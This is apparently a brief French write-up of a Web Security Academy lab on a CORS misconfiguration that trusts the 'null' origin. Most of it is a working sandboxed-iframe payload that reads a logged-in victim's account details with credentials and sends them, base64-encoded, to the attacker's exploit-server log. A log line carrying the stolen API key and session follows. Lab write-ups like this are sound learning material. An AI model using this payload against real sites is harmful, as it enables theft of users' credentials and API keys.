# __CORS vulnerability with trusted null origin__

Bon c’est un peu comme le même que celui d’avant, le « __CORS vulnerability with basic origin reflection »__

En fait les sites ont un white_liste et dans certaines ils ont le « null » dedans :

En rajoutant : ‘Origin :null ‘ 

dans l’entête on obtient une bonne réponse :

 ‘Access-Control-Allow-Origin: null’

Ce qui veut dire qu’il acceptera cette source. On fait alors un script html avec IFRAME

<iframe sandbox="allow-scripts" srcdoc=" <script> var xhr = new XMLHttpRequest(); // REMPLACEZ PAR L'URL DE LA CIBLE (ex: /accountDetails) var url = 'https://vulnerable-lab-id.web-security-academy.net/accountDetails'; xhr.onreadystatechange = function() { if (xhr.readyState == 4) { // Envoie le résultat au log de votre serveur d'exploit // btoa() encode en base64 pour éviter les problèmes de caractères spéciaux fetch('/log?key=' + btoa(xhr.responseText)); } }; xhr.open('GET', url, true); xhr.withCredentials = true; // Indispensable pour envoyer les cookies de session xhr.send(); </script> "></iframe>

On regarde les logs après avoir send l’exploit :

Et on a :

10.0.3.15       2026-02-17 11:55:59 +0000 "GET /log?key=ewogICJ1c2VybmFtZSI6ICJhZG1pbmlzdHJhdG9yIiwKICAiZW1haWwiOiAiIiwKICAiYXBpa2V5IjogInM3U0VxZVBLY3hSNWdQWmpUUXl0WWVJODdQcGF4NUo2IiwKICAic2Vzc2lvbnMiOiBbCiAgICAiZGZRZ2RTWHBHRElCR1I4VW5BelNYbDlpbzhsZTRsZm8iCiAgXQp9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

Et dedans en base64 il y a la clé api
